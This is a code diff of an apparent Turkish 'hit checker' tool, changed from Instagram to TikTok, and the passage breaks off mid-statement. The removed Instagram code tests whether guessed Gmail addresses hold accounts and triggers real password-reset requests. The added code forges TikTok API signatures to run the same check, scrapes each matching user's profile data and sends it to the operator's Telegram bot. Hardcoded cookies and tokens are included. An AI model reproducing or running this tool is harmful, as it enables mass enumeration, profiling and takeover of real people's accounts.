@@ -1,22 +1,8 @@
-import os
-import sys
-import time
-import random
-import requests
-import datetime
-import webbrowser
-import pytz
-import json
-from faker import Faker
-from secrets import token_hex
-from user_agent import generate_user_agent
-from random import choice, randrange
-from threading import Thread
-from rich.console import Console
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import re
 from random import choice as cc, randint as rr
 from uuid import uuid4 as gg
+import requests,os,pycountry
+from datetime import datetime
 try:
     import urllib.request
 except ModuleNotFoundError:
@@ -27,20 +13,18 @@ try:
 except ModuleNotFoundError:
     os.system("pip install rich")
     os.system("clear")
-#»»»»»»»»☝︎☝︎☝︎{𝐩𝐢𝐩}»»»»»»»»»»#
-basarli_ig = 0
 
-hatali_ig = 0
-
+import os,requests,random,time,secrets,binascii,uuid
+from urllib.parse import urlencode
+from MedoSigner import Argus,Gorgon,md5,Ladon
+from faker import Faker
+from time import sleep
+import requests, random, string
+from cfonts import render
+basarli_tt = 0
+hatali_tt = 0
 basarli_gmail = 0
-
 hatali_gmail = 0
-
-votlexkk = 0
-
-votlexbbb = 0
-
-#»»»»»»»{𝐝𝐞𝐠𝛊𝐬𝐤𝐞𝐧}☝︎☝︎☝︎
 E = '\033[1;31m'
 G = '\033[1;35m'
 Z = '\033[1;31m'  
@@ -74,61 +58,27 @@ MJ2 = '\x1b[38;5;216m'
 MJ3 = '\x1b[38;5;190m'
 MJ4 = '\x1b[38;5;106m'
 ma = '\x1b[38;5;26m'
-colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
-random_color = random.choice(colors)
-webbrowser.open('https://t.me/+FGvUQ89vjzNlZmVk')
 
-logo = f'\033[1;33m'"""
-⠀⢠⡔⠒⠋⠛⠛⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠋⠋⠛⠒⠲⣄⠀
-⢰⡇⠀⠀⠀⣀⣤⣤⣤⣤⣤⣤⣄⣤⣤⣤⣤⣤⣤⣄⣤⣄⣤⣠⣄⣤⣄⣤⣄⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⢸⡀
-⢸⠅⠀⢠⣾⣿⡿⣟⣿⣿⠿⠿⠿⣿⣿⢯⣟⣯⣿⣻⣟⣿⣻⢿⣻⣟⣿⣻⣿⣻⣯⣿⣽⣻⢿⣿⣧⡀⠀⢸⠄
-⢸⠀⠀⢸⣿⣿⣽⣿⣿⠿⠋⠀⠀⣿⣿⣻⣯⢿⡷⣿⣽⣯⢿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠙⠛⠿⣯⣿⡇⠀⢸⠀
-⢸⠀⠀⢸⣿⣽⣾⣿⡏⢀⡠⣾⣾⣿⡷⣿⣽⣿⣻⣽⡾⠟⠉⢁⣠⣤⣶⣶⣾⣿⣿⣷⣶⣤⡀⠈⠻⡇⠀⢸⠀
-⠨⠀⠀⢸⣿⣽⣿⠻⠟⠉⠀⣼⣿⣯⣿⣟⣾⣷⠟⠁⣀⣤⣾⣿⣿⣻⣽⣯⢿⣿⢷⡿⣾⣟⣿⣦⡀⠀⠀⢸⠀
-⠀⠀⠀⢸⣿⣻⡟⠀⠀⢴⣿⣿⣟⣾⢷⡿⠋⢀⣤⣾⣿⢿⣻⣽⣾⣟⣷⣿⣻⣯⡿⣟⣿⡾⣯⣿⣷⡀⠀⢸⠀
-⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⢧⣿⣿⠟⠀⣠⣿⣿⢿⣼⣿⢿⣻⣼⣟⣿⣼⣿⣧⣿⡿⣟⣿⡿⣧⣿⣇⠀⢸⠄
-⠀⠀⠀⢸⣿⢾⣻⣽⣯⢿⣽⣿⠟⠁⣠⣾⣿⡿⣽⣿⣻⣾⣟⣿⣽⡾⣟⣾⢿⣽⡷⣿⣻⣯⢿⣻⣽⣿⠀⢸⠀
-⠀⠀⠀⢸⣿⢿⣻⣷⢿⣻⡽⠋⢀⣾⣿⣟⣷⡿⣟⣾⣟⣷⡿⣽⣾⣟⡿⣯⣿⢯⣿⣻⣽⣟⣿⢯⣟⣿⠀⢸⠂
-⠀⠀⠀⢸⣿⣻⣯⢿⣻⠟⠀⣴⣿⣿⣻⣾⢯⣿⢿⣽⣾⣯⣿⣿⣾⣟⣿⣿⣽⡿⣯⣿⣽⡾⣟⣿⢯⣿⠀⢸⠀
-⠀⠀⠀⢸⣿⢯⣿⣿⠏⢀⣾⣿⣟⣾⢿⣽⣟⣯⣿⣿⣷⣤⠀⠀⠀⠀⠀⣾⣿⡿⣯⣷⢿⣻⣟⣯⣿⣿⠀⢸⠀
-⠀⠀⠀⢸⣿⣻⡽⠃⢠⣿⡿⣷⢿⣯⣿⣻⡾⣟⣿⣿⠟⠉⠀⠀⠀⠀⠐⣿⣿⢿⣽⣯⣿⢿⣽⢿⣾⡇⠀⢸⠀
-⠀⠀⠀⢸⣿⡿⠁⣰⣿⡿⣟⣿⣯⢿⣳⣿⣿⣿⠋⠁⠀⠀⠀⢀⣄⠀⢼⣿⡿⣟⣿⢾⣯⣿⢯⣿⡿⠁⠀⢸⠀
-⠀⠀⠀⢸⣿⠁⢠⣿⣟⣿⣻⣽⣾⢿⣻⣿⣿⡇⠀⠀⠀⢀⣴⣿⣿⣷⣽⣿⣿⣻⣯⡿⣷⣻⡿⣽⠇⠀⠀⢸⠀
-⠠⠀⠀⢸⠃⢠⣿⣿⢯⣿⣽⣷⢿⣿⣿⣿⣿⣇⠀⣠⠾⠋⠀⢹⣿⣿⣿⢿⣞⣿⣳⣿⢿⣽⣿⡏⢀⡇⠀⢸⠀
-⠐⡀⠀⠞⠀⣾⣿⣯⣿⣻⣾⣽⣿⣿⡿⢿⣿⣿⠞⠉⠀⠄⠀⢸⣿⡿⣯⣿⢯⣟⣿⡾⣟⣯⡟⠀⣾⡇⠀⢸⠀
-⠰⠅⠀⠀⣼⣿⢿⣞⣷⣿⣳⣿⣾⣿⡇⠀⠛⠁⠀⠀⠀⠀⣠⣿⣿⣟⣿⣽⡿⣯⣷⡿⣿⡟⠀⣼⣿⡇⠀⢸⠀
-⢨⠁⠀⢠⣿⣟⣿⢯⣿⢾⣟⣾⣿⣿⠀⠀⠀⠀⠀⣀⣴⣿⣿⣟⣷⡿⣽⣾⣟⣿⣳⣿⠟⠀⣼⣿⣿⡇⠀⢸⠀
-⢰⠀⠀⢸⣿⣻⣽⡿⣯⣿⢯⣿⣿⡟⠀⠀⠀⠀⠀⠙⢿⣿⡷⣿⢯⣿⣟⣷⡿⣽⣿⠋⢀⣾⣿⢿⣾⡇⠀⢸⠀
-⢸⠀⠀⣼⣿⣻⣽⡿⣯⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⣻⣷⣟⣯⣿⡿⠃⣠⣿⣿⢯⣿⣿⡇⠀⢸⠀
-⢨⠀⠀⣿⣿⢯⣷⡿⣟⣷⣿⣳⣿⢯⣿⣻⣟⣿⣻⡿⣽⣿⣻⣽⡿⣞⣯⣿⠟⢀⣴⣿⡿⣽⣿⣳⣿⡇⠀⢸⠀
-⢘⠀⠀⢹⣿⣟⣯⣿⢿⣽⣾⢿⣽⣿⣻⡷⣿⢯⣷⡿⣟⣾⣟⣷⡿⣿⠟⠁⣰⣿⡿⣯⣿⣟⣾⣟⣿⡇⠀⢸⠀
-⢨⡇⠀⠘⣿⣯⣿⣽⡟⣿⣾⡟⣿⡞⣿⣽⣿⢻⣯⣿⡟⣿⣾⣯⡟⠁⢠⣾⣿⣿⣽⣿⣾⣿⣷⣿⣿⡇⠀⢸⠀
-⢨⡇⠀⠀⢻⣿⣽⡿⣽⡿⣞⣿⣽⢿⣻⣽⣾⣟⣿⢾⣟⣿⠾⠋⢀⣴⣿⣿⣻⣾⣿⣿⠆⠃⢀⣿⣿⡇⠀⢸⠀
-⢠⡇⠀⡆⠀⠹⣿⣽⣟⡿⣿⣽⣾⢿⣻⣽⡾⣟⣾⠿⠋⠁⣠⣾⣿⢿⣻⣾⣟⣿⡏⠀⣀⣴⣼⣿⣿⡇⠀⢸⠀
-⠰⡇⠀⣿⣦⡀⠈⠙⠻⢿⣽⣾⣯⣿⠿⠷⠛⠉⢀⣠⣶⣿⣿⡿⣽⡿⣯⣷⣿⢿⡷⠊⠁⣹⣿⣿⣿⡇⠀⢸⠀
-⢸⠇⠀⢿⣿⢿⣶⣤⣀⣀⡀⠀⣀⣀⣀⣤⣶⣾⣿⢿⣻⣽⡾⣟⣯⣿⢿⣽⡏⠈⠀⣠⣾⣿⣟⣷⣿⡇⠀⢸⠀
-⣸⡇⠀⠸⣿⣿⢯⣟⣿⡿⣿⣿⢿⣿⢿⣟⣯⣿⡽⣿⣻⣽⣟⣿⣽⢯⣿⢿⣷⣶⣶⣾⣿⣟⣾⣯⡿⠃⠀⢸⡀
-⠘⡇⠀⠀⠈⠛⠻⠻⠛⠛⠓⠛⠛⠛⠛⠛⠛⠚⠛⠛⠛⠓⠛⠛⠚⠛⠛⠛⠛⠛⠛⠛⠓⠟⠛⠋⠀⠀⠀⢸⠀
-⠀⠙⠦⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠤⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-
-\x1b[38;5;208mTELEGRAM @Votlex1 :::: \x1b[38;5;193mCHANELL @Votlextool1
-
-\x1b[38;5;26mTOOL :::  İNSTA GMAİL 2011 - 2012 - 2013 #Comeback
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+logo = render('TikTok', font='block', colors=['white', 'blue'], align='center', space=True)
 
 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
-
-
-
+print("\x1b[1;39m—" * 65)
 print(logo)
+
+print("\x1b[38;5;193m~ DEVELOPER : @Votlex1 | Channel : @Votlextool1 | Tool : V1 ~")
+print("\x1b[1;39m—" * 65)
+print('\n')
+
 
 ID = input('\033[1;33m''İD GİR : ')
 print('')
 token = input('\x1b[38;5;193m''TOKEN GİR : ')
-
-
-anim = ["[api ile bağlantı kurulıyor\x1b[1;91m■\x1b[0m□□□□□□□□□]","[api ile bağlantı kurulıyor\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[api ile bağlantı kurulıyor\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[api ile bağlantı kurulıyor\x1b[1;95m■■■■\x1b[0m□□□□□□]", "[api ile bağlantı kurulıyor\x1b[1;94m■■■■■\x1b[0m□□□□□]", "[api ile bağlantı kurulıyor\x1b[38;5;26m■■■■■■\x1b[0m□□□□]", "[api ile bağlantı kurulıyor\x1b[1;96m■■■■■■■\x1b[0m□□□]", "[api ile bağlantı kurulıyor\x1b[38;5;86m■■■■■■■■\x1b[0m□□]", "[api ile bağlantı kurulıyor\x1b[38;5;96m■■■■■■■■■\x1b[0m□]", "[api ile bağlantı kurulıyor\x1b[38;5;203m■■■■■■■■■■\x1b[0m]"]
+time.sleep(2)
+#os.system('clear')
+import os,sys,uuid
+colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
+random_color = random.choice(colors)
+anim = ["[LÜTFEN BEKLE\x1b[1;91m■\x1b[0m□□□□□□□□□]","[LÜTFEN BEKLE\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[LÜTFEN BEKLE\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[LÜTFEN BEKLE\x1b[1;95m■■■■\x1b[0m□□□□□□]", "[LÜTFEN BEKLE\x1b[1;94m■■■■■\x1b[0m□□□□□]", "[LÜTFEN BEKLE\x1b[38;5;26m■■■■■■\x1b[0m□□□□]", "[LÜTFEN BEKLE\x1b[1;96m■■■■■■■\x1b[0m□□□]", "[LÜTFEN BEKLE\x1b[38;5;86m■■■■■■■■\x1b[0m□□]", "[LÜTFEN BEKLE\x1b[38;5;96m■■■■■■■■■\x1b[0m□]", "[LÜTFEN BEKLE\x1b[38;5;203m■■■■■■■■■■\x1b[0m]"]
 am = ('\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m')
 for i in range(50):
         time.sleep(.1)
@@ -138,187 +88,141 @@ for i in range(50):
         sys.stdout.flush()
 
 
+def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 567753, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
+    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
+    data = payload
+    if not unix:
+        unix = int(time.time())
+    return Gorgon(params, unix, payload, cookie).get_value() | {
+        "x-ladon": Ladon.encrypt(unix, license_id, aid),
+        "x-argus": Argus.get_sign(
+            params,
+            x_ss_stub,
+            unix,
+            platform=platform,
+            aid=aid,
+            license_id=license_id,
+            sec_device_id=sec_device_id,
+            sdk_version=sdk_version_str,
+            sdk_version_int=sdk_version
+        )
+    }
+
+def get_info(email):
+     username = email
+     username = email.split('@')[0]
+     patre={
+    "Host": "www.tiktok.com",
+    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
+    "sec-ch-ua-mobile": "?1",
+    "sec-ch-ua-platform": "\"Android\"",
+    "upgrade-insecure-requests": "1",
+    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
+    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
+    "sec-fetch-site": "none",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-user": "?1",
+    "sec-fetch-dest": "document",
+    "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3",}
+     patrek=requests.get(f'https://www.tiktok.com/@{username}',headers=patre).text
+     try:
+        getting = str(patrek.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
+        try:id = str(getting.split('id":"')[1]).split('",')[0]
+        except:id=""
+        try:name = str(getting.split('nickname":"')[1]).split('",')[0]
+        except:name=""
+        try:bio = str(getting.split('signature":"')[1]).split('",')[0]
+        except:bio=""
+        try:country = str(getting.split('region":"')[1]).split('",')[0]
+        except:country="" 
+        try:private = str(getting.split('privateAccount":')[1]).split(',"')[0]
+        except:private=""
+        try:followers = str(getting.split('followerCount":')[1]).split(',"')[0]
+        except:followers=""
+        try:following = str(getting.split('followingCount":')[1]).split(',"')[0]
+        except:following=""
+        try:like = str(getting.split('heart":')[1]).split(',"')[0]
+        except:like=""
+        try:video = str(getting.split('videoCount":')[1]).split(',"')[0]
+        except:video=""
+        try:secid = str(getting.split('secUid":"')[1]).split('"')[0]
+        except:video=""
+        countryn=str(pycountry.countries.get(alpha_2=country)).split("name='")[1].split("'")[0]
+        countryf=str(pycountry.countries.get(alpha_2=country)).split("flag='")[1].split("'")[0]
+        binary = "{0:b}".format(int(id))
+        i = 0
+        bits = ""
+        while i < 31:
+           bits += binary[i]
+           i += 1
+        timestamp = int(bits, 2)
+        cdt = datetime.fromtimestamp(timestamp)
+        kls=f"""───────────────\n⎌ KULLANCI ADI ➢ {username} \n⎌ ADI ➢ {name}\n⎌ EMAİL ➢ {username}@gmail.com\n⎌ TAKİPÇİ SAYISI ➢ {followers} \n⎌ TAKİP SAYISI ➢ {following}\n⎌ LİKE SAYISI ➢ {like}\n⎌ VİDEO SAYISI ➢ {video}\n⎌ GİZLİLİK ➢ {private}\n⎌ ÜLKE ➢ {countryn} {countryf}\n⎌ KURULUŞ TARİH ➢ {cdt}\n⎌ İD ➢ {id}\n⎌ BİO ➢ {bio}\n⎌ SESİONS İD ➢ {secid}\n⎌ TELEGRAM ➢\n@Votlex1| @Votlextool\n───────────────""";print(kls)
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(kls))
+     except:
+      kls=f"""───────────────\n⎌ İNFOSUZ HİT\n⎌ KULLANCI ADI ➢ {username} \n⎌ EMAİL ➢ {username}@gmail.com\n⎌ TELEGRAM ➢ @Votlex1 | @Votlextool───────────────""";print(kls)
+      requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(kls))
 
 
-def resetbro(email):
-    global votlexbbb
-    user = email.split('@')[0]
-    baslik = {
-      'User-Agent': str(generate_user_agent()),
-      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-      'x-ig-www-claim': "0",
-      'x-web-session-id': "pdpuh3:hnl96m:7xxycv",
-      'sec-ch-ua-platform-version': "\"\"",
-      'x-requested-with': "XMLHttpRequest",
-      'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-      'sec-ch-prefers-color-scheme': "dark",
-      'x-csrftoken': "4cKwelJ3l4nSGw45VtrbO5VIe47xcPId",
-      'sec-ch-ua-platform': "\"Linux\"",
-      'x-ig-app-id': "936619743392459",
-      'sec-ch-ua-model': "\"\"",
-      'sec-ch-ua-mobile': "?0",
-      'x-instagram-ajax': "1019237993",
-      'x-asbd-id': "129477",
-      'origin': "https://www.instagram.com",
-      'sec-fetch-site': "same-origin",
-      'sec-fetch-mode': "cors",
-      'sec-fetch-dest': "empty",
-      'referer': "https://www.instagram.com/accounts/password/reset/?hl=tr",
-      'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-      'Cookie': "ig_did=2D779848-745D-4150-A945-498328A2E425; datr=uQVoZ6T8vjGRDwoZk8p5Q0nz; mid=Z2gFuQABAAHN6QellqWfQ6hZS5j8; ig_nrcb=1; ps_l=1; ps_n=1; csrftoken=4cKwelJ3l4nSGw45VtrbO5VIe47xcPId; dpr=3.0234789848327637; wd=891x982"}
 
-    istek = {
-      'email_or_username': f"{user}"}
-    try:
-        response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', data=istek, headers=baslik)
-        rest = response.json()['contact_point']
-    except:
-        rest = 'RESET YOK BRO'
-    try:
-        baslik1 = {
-    'authority': 'www.instagram.com',
-    'accept': '*/*',
-    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-    f'referer': 'https://www.instagram.com/{user}/',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    'x-asbd-id': '129477',
-    'x-csrftoken': 'imA67qsBLyN96eLTamoh4kaZBqaoq9Hq',
-    'x-ig-app-id': '936619743392459',
-    'x-ig-www-claim': 'hmac.AR0Gqm5ikC8qQcyoxd92BHLLfoC4rZTEkJA-MT5F6Qy5CAU3',
-    'x-requested-with': 'XMLHttpRequest',}
 
-        params = {
-    'username': f'{user}',}
 
-        re = requests.get(
-    'https://www.instagram.com/api/v1/users/web_profile_info/',
-    params=params,
-    headers=baslik1,).json()
-    
-        kullanci = re['data']['user']['username']
-        bio = re['data']['user']['biography']
-        takipçi = re['data']['user']['edge_followed_by']['count']
-        takip = re['data']['user']['edge_follow']['count']
-        ad = re['data']['user']['full_name']
-        id = re['data']['user']['id']
-        katagori = re['data']['user']['category_name']
-        gizlilik = re['data']['user']['is_private']
-        tik = re['data']['user']['is_verified']
-        post = re['data']['user']['edge_owner_to_timeline_media']['count']
-        try:
-            if id == None:tarih=None
-            else:
-                    tarih = requests.get(f'https://gojoapi.pythonanywhere.com/get-year',params={'Id':{id}}).json().get('year','TARİH YOK')
-        except:tarih=None
-        votlexbbb += 1
-        tlg = f'''
-«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
-    [🂱] 𝐇𝐈𝐓 ➪ {votlexbbb}
-    [🂱] 𝐀𝐃𝐈 ➪ {ad}
-    [🂱] 𝐊.𝐀𝐃 ➪  {kullanci}
-    [🂱] 𝐄𝐌𝐀𝐈𝐋 ➪ {kullanci}@gmail.com
-    [🂱] 𝐓𝐀𝐊𝐈𝐏𝐂̧𝐈 ➪ {takipçi}
-    [🂱] 𝐓𝐀𝐊𝐈𝐏 ➪  {takip}
-    [🂱] 𝐈𝐃'𝐒𝐈 ➪  {id}
-    [🂱] 𝐏𝐎𝐒𝐓 𝐒𝐀𝐘𝐈𝐒𝐈 ➪  {post}
-    [🂱] 𝐁𝐈𝐎'𝐒𝐔 ➪ {bio}
-    [🂱] 𝐌𝐀𝐕𝐈 𝐓𝐈𝐊 ? ➪ {"evet" if tik else "hayır"}
-    [🂱] 𝐇𝐄𝐒𝐀𝐏 𝐆𝐈𝐙𝐋𝐈𝐌𝐈 ? ➪ {"Evet" if gizlilik else "Hayır"}
-    [🂱] 𝐊𝐀𝐓𝐀𝐆𝐎𝐑𝐈 ➪ {katagori if katagori else "Yok"}
-    [🂱] 𝐓𝐀𝐑𝐈𝐇 ➪ {tarih}
-    [🂱] 𝐑𝐄𝐒𝐄𝐓 ➪ {rest}
-«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
-    𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : @Votlex1 @Votlextool1 '''
-        print(tlg)
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))
-        
-    except:
-        tlg = f'''
-«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
-    𝐈𝐍𝐅𝐎𝐒𝐔𝐙 𝐇𝐈𝐓
-    [🂱] 𝐊𝐔𝐋𝐋𝐀𝐍𝐂𝐈 𝐀𝐃𝐈 ➪ {user}
-    [🂱] 𝐄𝐌𝐀𝐈𝐋 ➪ {user}@gmail.com
-«««««««☾︎𝐕𝐎𝐓𝐋𝐄𝐗☽︎»»»»»»»
-    𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : @Votlex1 @Votlextool '''
-        print(tlg)
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))
-        
-def votlex_insta(email):
-    global basarli_ig, hatali_ig
+
+
+
+
+
+def votlex_tiktok(email):
+    global basarli_tt, hatali_tt
     email = email + '@gmail.com'
-    url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
-    
-    payload = {
-      'enc_password': "#PWD_INSTAGRAM_BROWSER:10:1736421502:AVVQAByDjqCz661dAt7I4WaXWojhfRVQefbzbP0wMiHQI54K8I2DOM1EiagPkyf1TyS9G2SgZvY+eQoO8JgigfGeakRsHJpRMyuUKEb9Y2nnQnQfqzoPmQ5DWyOgmAikF+vLIr8zueygeBE=",
-      'email': email,
-      'failed_birthday_year_count': "{}",
-      'first_name': "Bababebh",
-      'username': "yoklelelley",
-      'opt_into_one_tap': "false",
-      'use_new_suggested_user_name': "true"
-    }
-    
+    secret = secrets.token_hex(16)
+    tim = str(round(random.uniform(1.2, 1.6) * 100000000) * -1)
+    timr = str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"
+    cc = str(uuid.uuid4())
+    op = str(binascii.hexlify(os.urandom(8)).decode())
+    iid = str(random.randint(1, 10**19))
+    dev = str(random.randint(1, 10**19))
+
+    data = {
+    'account_sdk_source': 'app',
+    'multi_login': '1',
+    'email': email,
+    'mix_mode': '1'}
+    cookies = {
+    'passport_csrf_token': secret,
+    'passport_csrf_token_default': secret,}
+    m = sign(
+    params='passport-sdk-version=19&iid='+iid+'&device_id='+dev+'&ac=mobile&channel=googleplay&aid=567753&app_name=tiktok_studio&version_code=320905&version_name=32.9.5&device_platform=android&os=android&ab_version=32.9.5&ssmix=a&device_type=Redmi%20Note%208%20Pro&device_brand=Redmi&language=ar&os_api=30&os_version=11&openudid='+op+'&manifest_version_code=320905&resolution=1080*2220&dpi=440&update_version_code=320905&_rticket='+timr+'&is_pad=0&app_type=normal&sys_region=TR&mcc_mnc=42103&timezone_name=Avrupa/Ankara&app_language=tr&carrier_region=TR&ac2=lte&uoo=1&op_region=TR&timezone_offset=10800&build_number=32.9.5&host_abi=arm64-v8a&locale=ar&region=EG&ts='+tim+'&cdid='+cc+'&support_webview=1&cronet_version=5828ea06_2024-03-28&ttnet_version=4.2.137.58-tiktok&use_store_region_cookie=1',
+    payload=urlencode(data),
+    cookie=urlencode(cookies))
+
     headers = {
-      'User-Agent': str(generate_user_agent()),
-      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-      'x-ig-www-claim': "0",
-      'x-web-session-id': "f1gmpo:6kvyjw:7iwyyc",
-      'sec-ch-ua-platform-version': "\"\"",
-      'x-requested-with': "XMLHttpRequest",
-      'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-      'sec-ch-prefers-color-scheme': "dark",
-      'x-csrftoken': "4cKwelJ3l4nSGw45VtrbO5VIe47xcPId",
-      'sec-ch-ua-platform': "\"Linux\"",
-      'x-ig-app-id': "936619743392459",
-      'sec-ch-ua-model': "\"\"",
-      'sec-ch-ua-mobile': "?0",
-      'x-instagram-ajax': "1019227817",
-      'x-asbd-id': "129477",
-      'origin': "https://www.instagram.com",
-      'sec-fetch-site': "same-origin",
-      'sec-fetch-mode': "cors",
-      'sec-fetch-dest': "empty",
-      'referer': "https://www.instagram.com/accounts/emailsignup/",
-      'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-      'Cookie': "ig_did=2D779848-745D-4150-A945-498328A2E425; datr=uQVoZ6T8vjGRDwoZk8p5Q0nz; mid=Z2gFuQABAAHN6QellqWfQ6hZS5j8; ig_nrcb=1; ps_l=1; ps_n=1; dpr=3.0234789848327637; csrftoken=4cKwelJ3l4nSGw45VtrbO5VIe47xcPId; wd=891x1669"
-    }
-    
-    vtl = requests.post(url, data=payload, headers=headers).text
-    if "email_is_taken" in vtl:
-        resetbro(email)
-        basarli_ig += 1
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'User-Agent': 'com.ss.android.tt.creator/320905 (Linux; U; Android 11; tr_TR; Redmi Note 8 Pro; Build/RP1A.200720.011; Cronet/TTNetVersion:5828ea06 2024-03-28 QuicVersion:68c84b0f 2024-02-29)',
+    'x-argus': m["x-argus"],
+    'x-gorgon': m["x-gorgon"],
+    'x-khronos': m["x-khronos"],
+    'x-ladon': m["x-ladon"],}
+
+    vtl = requests.post(
+    'https://api16-normal-no1a.tiktokv.eu/passport/user/check_email_registered?passport-sdk-version=19&iid='+iid+'&device_id='+dev+'&ac=mobile&channel=googleplay&aid=567753&app_name=tiktok_studio&version_code=320905&version_name=32.9.5&device_platform=android&os=android&ab_version=32.9.5&ssmix=a&device_type=Redmi%20Note%208%20Pro&device_brand=Redmi&language=tr&os_api=30&os_version=11&openudid='+op+'&manifest_version_code=320905&resolution=1080*2220&dpi=440&update_version_code=320905&_rticket='+timr+'&is_pad=0&app_type=normal&sys_region=TR&mcc_mnc=42103&timezone_name=Avrupa/Ankara&app_language=tr&carrier_region=TR&ac2=lte&uoo=1&op_region=TR&timezone_offset=10800&build_number=32.9.5&host_abi=arm64-v8a&locale=ar&region=TR&ts='+tim+'&cdid='+cc+'&support_webview=1&cronet_version=5828ea06_2024-03-28&ttnet_version=4.2.137.58-tiktok&use_store_region_cookie=1',
+    cookies=cookies,
+    headers=headers,
+    data=data,).text
+    if '"is_registered":1' in vtl:
+        get_info(email)
+        basarli_tt += 1        
         os.system('clear')
+        print(logo)
         print(f''' 
-        𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 «««« (𝐕𝐎𝐓𝐋𝐄𝐗) »»»»
-             ___________________________________
-        (1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
-        (2) : {E}HATALI İG {a6}{hatali_ig}
-        (3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
-        (4) : {E}HATALI GMAİL {a5}{hatali_gmail}
-        (9) : {X}CHECKLENEN EMAİL {email} ''')
+{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
     else:
-        hatali_ig += 1
+        hatali_tt += 1
         os.system('clear')
+        print(logo)
         print(f''' 
-        «««« (𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑) »»»»
-             ___________________________________
-        (1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
-        (2) : {E}HATALI İG {a6}{hatali_ig}
-        (3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
-        (4) : {E}HATALI GMAİL {a5}{hatali_gmail}
